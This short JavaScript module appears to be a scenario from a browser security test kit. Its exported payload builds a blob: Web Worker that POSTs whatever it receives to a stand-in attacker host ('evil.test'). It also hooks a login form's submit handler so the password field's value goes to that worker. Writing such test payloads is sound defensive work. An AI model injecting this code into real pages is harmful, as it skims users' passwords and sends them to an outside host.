// Attack: a blob: worker that sends what the page hands it.
import { scenario } from './probe-kit.js';

export const respond = scenario((ctx) => `var w = new Worker(URL.createObjectURL(new Blob(["onmessage = function (e) { fetch('${ctx.origin('evil.test')}/w', { method: 'POST', body: e.data }); };"])));
document.getElementById('login').addEventListener('submit', function () { w.postMessage(document.getElementById('password').value); });`);
